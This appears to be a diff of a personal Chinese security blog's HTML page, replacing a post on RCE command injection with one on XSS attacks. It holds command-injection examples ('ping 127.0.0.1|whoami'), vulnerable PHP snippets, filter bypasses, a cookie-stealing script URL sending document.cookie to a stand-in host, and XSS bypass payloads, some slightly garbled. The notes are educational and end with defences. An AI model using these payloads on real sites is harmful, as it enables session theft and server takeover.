@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="欢迎来到Hbluewhite的博客, Hbluewhite的Blog">
+    <meta name="keywords" content="XSS攻击, Hbluewhite的Blog">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>欢迎来到Hbluewhite的博客 | Hbluewhite的Blog</title>
+    <title>XSS攻击 | Hbluewhite的Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -356,12 +356,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">欢迎来到Hbluewhite的博客</h1>
+                    <h1 class="description center-align post-title">XSS攻击</h1>
                 </div>
             </div>
         </div>
@@ -475,9 +475,13 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/web%E6%BC%8F%E6%B4%9E/">
+                                <span class="chip bg-color">web漏洞</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -489,7 +493,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-08-20
+                    2021-08-21
                 </div>
                 
 
@@ -510,96 +514,34 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="RCE远程代码-命令执行"><a href="#RCE远程代码-命令执行" class="headerlink" title="RCE远程代码/命令执行"></a>RCE远程代码/命令执行</h2><h2 id="RCE概述"><a href="#RCE概述" class="headerlink" title="RCE概述"></a>RCE概述</h2><p>RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p>
-<h2 id="RCE漏洞产生的原因"><a href="#RCE漏洞产生的原因" class="headerlink" title="RCE漏洞产生的原因"></a>RCE漏洞产生的原因</h2><p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并且返回测试结果。如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台执行，从而控制整个后台服务器。</p>
-<p><strong>具体的后端代码</strong></p>
-<p><code>$result . =shell_exec(&#39;ping &#39; .$ip);</code>//直接将变量拼接进来，没做处理</p>
-<p><code>if(@!eval($_POST[&#39;txt&#39;]))</code>//远程代码执行evel。</p>
-<p>这里和上面执行ping指令不同的时，这里是php代码，而上面执行的是命令行。</p>
-<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>Windows管道符</p>
-<table>
-<thead>
-<tr>
-<th>管理符</th>
-<th>作用</th>
-<th>举例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>|</td>
-<td>直接执行后面的语句</td>
-<td>ping 127.0.0.1|whoami</td>
-</tr>
-<tr>
-<td>||</td>
-<td>前面的语句执行出错则执行后面的语句</td>
-<td>ping 127.0.0.1||whoami</td>
-</tr>
-<tr>
-<td>&amp;</td>
-<td>前面的语句为假则执行后面的语句</td>
-<td>ping 127.0.0.1&amp;whoami</td>
-</tr>
-<tr>
-<td>&amp;&amp;</td>
-<td>前面的语句为假，直接出错，前面的语句为真，执行后面的语句</td>
-<td>ping 127.0.0.1&amp;&amp;whoami</td>
-</tr>
-<tr>
-<td>；</td>
-<td>先执前面的语句后执行后面的语句</td>
-<td>ping 127.0.0.1;whoami</td>
-</tr>
-</tbody></table>
-<p>一般我们是需要用后面的语句来进行攻击，所以首选|。</p>
-<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>尽量不要使用命令执行函数</p>
-<p>不要让用户控制参数</p>
-<p>执行前做好检测和过滤</p>
-<h2 id="PHP命令执行函数"><a href="#PHP命令执行函数" class="headerlink" title="PHP命令执行函数"></a>PHP命令执行函数</h2><ol>
-<li>system():</li>
+                <h1 id="xss攻击"><a href="#xss攻击" class="headerlink" title="xss攻击"></a>xss攻击</h1><h2 id="定义：xss攻击通常指的是利用网页开发时留下的漏洞，通过巧妙的方法注入恶意的指令代码到网页，使用户加载并执行攻击者恶意执照的程序。网页的恶意程序通常是JavaScript，也有Java、VBScript、ActiveX、Flash甚至是普通的html。"><a href="#定义：xss攻击通常指的是利用网页开发时留下的漏洞，通过巧妙的方法注入恶意的指令代码到网页，使用户加载并执行攻击者恶意执照的程序。网页的恶意程序通常是JavaScript，也有Java、VBScript、ActiveX、Flash甚至是普通的html。" class="headerlink" title="定义：xss攻击通常指的是利用网页开发时留下的漏洞，通过巧妙的方法注入恶意的指令代码到网页，使用户加载并执行攻击者恶意执照的程序。网页的恶意程序通常是JavaScript，也有Java、VBScript、ActiveX、Flash甚至是普通的html。"></a>定义：xss攻击通常指的是利用网页开发时留下的漏洞，通过巧妙的方法注入恶意的指令代码到网页，使用户加载并执行攻击者恶意执照的程序。网页的恶意程序通常是JavaScript，也有Java、VBScript、ActiveX、Flash甚至是普通的html。</h2><h2 id="危害：劫持用户通话、插入恶意内容、重定向用户、使用恶意软件劫持用户浏览器、繁殖xss蠕虫，甚至破坏网站、修改路由器配置信息。"><a href="#危害：劫持用户通话、插入恶意内容、重定向用户、使用恶意软件劫持用户浏览器、繁殖xss蠕虫，甚至破坏网站、修改路由器配置信息。" class="headerlink" title="危害：劫持用户通话、插入恶意内容、重定向用户、使用恶意软件劫持用户浏览器、繁殖xss蠕虫，甚至破坏网站、修改路由器配置信息。"></a>危害：劫持用户通话、插入恶意内容、重定向用户、使用恶意软件劫持用户浏览器、繁殖xss蠕虫，甚至破坏网站、修改路由器配置信息。</h2><h2 id="原理：HTML是一种超文本语言，通过将一些字符特殊地对待来区别文本和标记，例如与之间的字符是页面的标题等等。当插入’-lt-’符号时会默认为html的标签，在其中写入JavaScript的脚本，将会被用户浏览器所执行。使用，当这些特殊字符不被当动态页面检查或者检查出现失误后，就会产生xss漏洞。"><a href="#原理：HTML是一种超文本语言，通过将一些字符特殊地对待来区别文本和标记，例如与之间的字符是页面的标题等等。当插入’-lt-’符号时会默认为html的标签，在其中写入JavaScript的脚本，将会被用户浏览器所执行。使用，当这些特殊字符不被当动态页面检查或者检查出现失误后，就会产生xss漏洞。" class="headerlink" title="原理：HTML是一种超文本语言，通过将一些字符特殊地对待来区别文本和标记，例如与之间的字符是页面的标题等等。当插入’&lt;’符号时会默认为html的标签，在其中写入JavaScript的脚本，将会被用户浏览器所执行。使用，当这些特殊字符不被当动态页面检查或者检查出现失误后，就会产生xss漏洞。"></a>原理：HTML是一种超文本语言，通过将一些字符特殊地对待来区别文本和标记，例如<title>与</title>之间的字符是页面的标题等等。当插入’&lt;’符号时会默认为html的标签，在其中写入JavaScript的脚本，将会被用户浏览器所执行。使用，当这些特殊字符不被当动态页面检查或者检查出现失误后，就会产生xss漏洞。</h2><h3 id="例如：用户通过访问url-http-127-0-0-1-name-abc-就会在浏览器输入如下信息-hello-abc-如果我们传递这样的一个url-http-127-0-0-1-name-60-script-62-alert-39-abc-xss-39-60-script-62-这时你就会发现弹出一个弹出框，这说明站点已经存在xss漏洞。那么恶意用户如何盗取cookie呢？与上面类似先写这样的一个url-url-http-127-0-0-1-name-60-script-62-document-location-href-’http-www-xxx-com-cookie-39-document-cookie-60-script-gt-这样类似的代码就会将当前的cookie发送到指定的站点：www-xxx-com"><a href="#例如：用户通过访问url-http-127-0-0-1-name-abc-就会在浏览器输入如下信息-hello-abc-如果我们传递这样的一个url-http-127-0-0-1-name-60-script-62-alert-39-abc-xss-39-60-script-62-这时你就会发现弹出一个弹出框，这说明站点已经存在xss漏洞。那么恶意用户如何盗取cookie呢？与上面类似先写这样的一个url-url-http-127-0-0-1-name-60-script-62-document-location-href-’http-www-xxx-com-cookie-39-document-cookie-60-script-gt-这样类似的代码就会将当前的cookie发送到指定的站点：www-xxx-com" class="headerlink" title="例如：用户通过访问url:http://127.0.0.1/?name=abc,就会在浏览器输入如下信息: hello abc,如果我们传递这样的一个url:http://127.0.0.1/?name= &#60; script&#62;alert(&#39;abc,xss&#39;)&#60;/script&#62;这时你就会发现弹出一个弹出框，这说明站点已经存在xss漏洞。那么恶意用户如何盗取cookie呢？与上面类似先写这样的一个url: url:http://127.0.0.1/?name= &#60; script&#62;document.location.href=’http://www.xxx.com/cookie?&#39;+document.cookie&#60;/script&gt;,这样类似的代码就会将当前的cookie发送到指定的站点：www.xxx.com/"></a>例如：用户通过访问url:<a target="_blank" rel="noopener" href="http://127.0.0.1/?name=abc,%E5%B0%B1%E4%BC%9A%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BE%93%E5%85%A5%E5%A6%82%E4%B8%8B%E4%BF%A1%E6%81%AF">http://127.0.0.1/?name=abc,就会在浏览器输入如下信息</a>: <strong>hello abc</strong>,如果我们传递这样的一个url:<a target="_blank" rel="noopener" href="http://127.0.0.1/?name=">http://127.0.0.1/?name=</a> &#60; script&#62;alert(&#39;abc,xss&#39;)&#60;/script&#62;这时你就会发现弹出一个弹出框，这说明站点已经存在xss漏洞。那么恶意用户如何盗取cookie呢？与上面类似先写这样的一个url: url:<a target="_blank" rel="noopener" href="http://127.0.0.1/?name=">http://127.0.0.1/?name=</a> &#60; script&#62;document.location.href=’<a target="_blank" rel="noopener" href="http://www.xxx.com/cookie?&#39;+document.cookie&#60;/script&gt;,%E8%BF%99%E6%A0%B7%E7%B1%BB%E4%BC%BC%E7%9A%84%E4%BB%A3%E7%A0%81%E5%B0%B1%E4%BC%9A%E5%B0%86%E5%BD%93%E5%89%8D%E7%9A%84cookie%E5%8F%91%E9%80%81%E5%88%B0%E6%8C%87%E5%AE%9A%E7%9A%84%E7%AB%99%E7%82%B9%EF%BC%9Awww.xxx.com/">http://www.xxx.com/cookie?&#39;+document.cookie&#60;/script&gt;,这样类似的代码就会将当前的cookie发送到指定的站点：www.xxx.com/</a></h3><h2 id="类型-从攻击代码的工作方式可以分为三个类型"><a href="#类型-从攻击代码的工作方式可以分为三个类型" class="headerlink" title="类型:从攻击代码的工作方式可以分为三个类型"></a>类型:从攻击代码的工作方式可以分为三个类型</h2><ol>
+<li>持久性跨站：最直接的危害类型，跨站代码存储在服务器中。存储型：主要让用户输入数据。其他用户浏览查看的地方，例如留言、评论、博客、日志等表单。过程：浏览器-后端-浏览器</li>
+<li>非持久性跨站：反射性跨站脚本漏洞，最普遍的类型。用户访问服务器-跨站链接-返回跨站代码。过程：浏览器-后端-数据库-后端-浏览器</li>
+<li>DOM跨站（DOM XSS）：DOM（文档对象模型），客户端脚本处理逻辑导致的安全问题。是指受害者端的页面脚本在修改本地页面DOM环境是未进行合理的处置，而使得攻击脚本被执行。在整个攻击过程中，服务器响应的页面并没有发生变化，引起客户端脚本执行结果的差异的原因是对本地DOM的恶意篡改利用。过程：url-浏览器</li>
 </ol>
-<p>system 执行外部程序（命令行），并且显示输出</p>
-<p>这个函数会将结果直接进行输出（注意：是直接输出区别于返回值），<strong>命令成功后返回输出的最后一行</strong>，失败返回FALSE。</p>
-<ol start="2">
-<li>shell_exec()：</li>
+<h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>常见的xss的攻击手段和目的：</p>
+<ol>
+<li>盗用cookie,获取敏感信息。</li>
+<li>利用植入Flash,通过crossdomain权限设置进一步获取更高权限，或者利用Java等此类的操作。</li>
+<li>利用iframe、frame、XMLHttpRequest或者上述flash等方式，以用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。</li>
+<li>利用可被攻击的域收到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</li>
+<li>在访问极大的一些页面上的xss可以攻击游戏额小型的网站，实现DDoS攻击效果</li>
 </ol>
-<p>shell_exec通过shell环境执行命令（<strong>这就意味着这个方法只能在liunx或mac os的shell环境中使用</strong>），并且完整的输出以字符串的方式返回。如果执行过程中发生错误或者进程不产生输出，则返回NULL。</p>
-<ol start="3">
-<li>exec():</li>
+<h2 id="绕过方式："><a href="#绕过方式：" class="headerlink" title="绕过方式："></a>绕过方式：</h2><ol>
+<li>可以用**/**代替空格。</li>
+<li>运用大小写绕过：&lt;imGRC=xonerRo=alert(“xss”)&gt;</li>
+<li><strong>双写关键词</strong>：&lt;imimggsrsrcc=xonerror=alert(“xss”)&gt;</li>
+<li><strong>利用eval字符拼接</strong>：&lt;imgsrc=”x” onerror=”a=alert;b=’(xss);’ ;eval(a+b+c)”&gt;</li>
+<li><strong>利用top</strong>：<script>top<a href="%E2%80%99xss%E2%80%98">"al"+"ert"</a>;</script></li>
+<li>其他字符混淆：可以利用注释、标签的优先级：&lt;<script>alert("xss");//<</script>   2.<title>&lt;img src=</title>&gt;&lt;img src=x onerror=”alert(“xss”);”&gt; 因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效 </li>
+<li>编码绕过: Unicode 编码绕过<strong>如果是在html中，我们可以不用应该好。绕过是在js中，我们可以通过反引号代替单双引号</strong>&lt;img src=”C:/Users/86182/Desktop/x” onerror=alert(<code>xss</code>);&gt; 当括号被过滤的时候我们可以使用throw来绕过&lt;svg/onload=”window.onerror=eval;throw’=alert\x281\x29’;”&gt;过滤</li>
 </ol>
-<p>exec执行一个外部程序</p>
-<p>返回命令执行结果最后一行的内容。不显示回显。如果想要获取命令的输出内容，请确保使用output参数，或者利用这个函数来构建反弹shell。</p>
-<ol start="4">
-<li>passthru():</li>
+<h2 id="预防xss"><a href="#预防xss" class="headerlink" title="预防xss"></a>预防xss</h2><ol>
+<li>过滤一些危险的字符，以及转义&amp;&lt;&gt;” ‘ /等危险的字符</li>
+<li>HTTP-only Cookie：禁止JavaScript读取某县敏感的Cookie，攻击者完成XSS后注入后也无法窃取Cookie</li>
+<li>设置CSP(Conrwnr Awxurity Policy)</li>
+<li>输入内容长短限制</li>
 </ol>
-<p>passthru 执行外部程序并且显示原始输出</p>
-<ol start="5">
-<li>反引号</li>
-</ol>
-<p>反引号可以用来在php代码中直接执行系统命令，但是想要回显的话还需要一个echo：</p>
-<ol start="6">
-<li>花括号</li>
-</ol>
-<p>{command，}</p>
-<ol start="7">
-<li>echo命令</li>
-</ol>
-<h2 id="PHP代码执行函数"><a href="#PHP代码执行函数" class="headerlink" title="PHP代码执行函数"></a>PHP代码执行函数</h2><p>代码执行漏洞与命令执行漏洞具有相通性。</p>
-<p>利用系统函数实现命令执行，在php下，允许命令执行的函数有：</p>
-<p>eval（），assert（），preg_replace()、**${}**等</p>
-<p>${}执行代码（在双引号中倘若有${}出现，那么{}内的内容将被当作php代码块来执行。）</p>
-<h2 id="实战过滤"><a href="#实战过滤" class="headerlink" title="实战过滤"></a>实战过滤</h2><ol>
-<li>遇到运算符过滤绕过</li>
-</ol>
-<p>%0a换行</p>
-<ol start="2">
-<li>空格及关键词过滤绕过</li>
-</ol>
-<p>${IFS} 关键词中加入$* 绕过</p>
-<ol start="3">
-<li>cat过滤</li>
-</ol>
-<p>使用双引号进行绕过</p>
 
                 
             </div>
@@ -626,7 +568,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/08/20/%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0Hbluewhite%E7%9A%84%E5%8D%9A%E5%AE%A2/">http://example.com/2021/08/20/%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0Hbluewhite%E7%9A%84%E5%8D%9A%E5%AE%A2/</a>
+                    <a href="http://example.com/2021/08/21/XSS%E6%94%BB%E5%87%BB/">http://example.com/2021/08/21/XSS%E6%94%BB%E5%87%BB/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -663,7 +605,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/web%E6%BC%8F%E6%B4%9E/">
+                                    <span class="chip bg-color">web漏洞</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -1104,13 +1050,13 @@
                 <i class="far fa-dot-circle"></i>&nbsp;本篇
             </div>
             <div class="card">
-                <a href="/2021/08/20/%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0Hbluewhite%E7%9A%84%E5%8D%9A%E5%AE%A2/">
+                <a href="/2021/08/21/XSS%E6%94%BB%E5%87%BB/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/16.png" class="responsive-img" alt="欢迎来到Hbluewhite的博客">
+                        <img src="/medias/featureimages/15.png" class="responsive-img" alt="XSS攻击">
                         
-                        <span class="card-title">欢迎来到Hbluewhite的博客</span>
+                        <span class="card-title">XSS攻击</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1121,7 +1067,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-20
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-21
                             </span>
                         <span class="publish-author">
                             
@@ -1133,6 +1079,14 @@
                 </div>
 
                 
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web%E6%BC%8F%E6%B4%9E/">
+                        <span class="chip bg-color">web漏洞</span>
+                    </a>
+                    
+                </div>
+                
             </div>
         </div>
         
@@ -1142,13 +1096,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/08/20/hhh/">
+                <a href="/2021/08/20/RCE/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/2.png" class="responsive-img" alt="hhh">
+                        <img src="/medias/featureimages/16.png" class="responsive-img" alt="欢迎来到Hbluewhite的博客">
                         
-                        <span class="card-title">hhh</span>
+                        <span class="card-title">欢迎来到Hbluewhite的博客</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
